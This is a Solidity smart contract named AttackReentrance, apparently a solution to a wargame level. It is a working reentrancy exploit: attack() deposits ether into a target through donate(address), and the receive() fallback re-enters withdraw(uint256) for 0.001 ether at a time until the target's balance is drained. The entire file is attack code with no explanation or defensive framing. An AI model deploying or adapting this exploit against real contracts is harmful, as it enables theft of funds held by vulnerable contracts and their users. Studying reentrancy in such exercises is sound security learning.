// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract AttackReentrance {

 
  address payable king;

  constructor(address payable _king) payable {
    king = _king;
  }
   receive() external payable {
       if (king.balance >= 0.001 ether) {
        withdraw();

       }
   }
    function attack() public payable {
        (bool ok, ) = address(king).call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(ok);
    }
    function withdraw() public  {
        (bool ok, ) = address(king).call(abi.encodeWithSignature("withdraw(uint256)", 0.001 ether));
        require(ok);
    }
}
